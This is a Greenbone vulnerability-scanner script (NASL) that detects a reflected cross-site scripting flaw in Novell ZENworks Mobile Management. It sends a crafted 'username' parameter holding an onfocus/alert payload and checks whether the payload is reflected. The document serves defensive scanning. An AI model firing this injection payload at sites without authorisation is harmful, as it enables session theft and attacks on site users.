# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:novell:zenworks_mobile_management";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105297");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_version("2023-07-25T05:05:58+0000");

  script_name("Novell ZENworks Mobile Management Cross Site Scripting");

  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/132287/ZENWorks-Mobile-Management-3.1.0-Cross-Site-Scripting.html");

  script_tag(name:"impact", value:"An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site.
  This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response.");

  script_tag(name:"insight", value:"The parameters 'username' and 'domain' are not sanitized sufficiently resulting in a reflected
  cross-site scripting vulnerability. This reflected cross-site scripting vulnerability can be exploited in
  the context of an unauthenticated user by sending a specially crafted HTTP POST or HTTP GET request.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"summary", value:"ZENWorks Mobile Management suffers from cross site scripting vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2015-06-15 13:34:59 +0200 (Mon, 15 Jun 2015)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_dependencies("gb_novell_zenworks_mobile_management_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("zenworks_mobile_management/installed");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = dir + '/index.php?username="onfocus="alert(/VT-XSS-Test/)';

if( http_vuln_check( port:port, url:url, pattern:'value=""onfocus="alert\\(/VT-XSS-Test/\\)"', check_header:TRUE ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
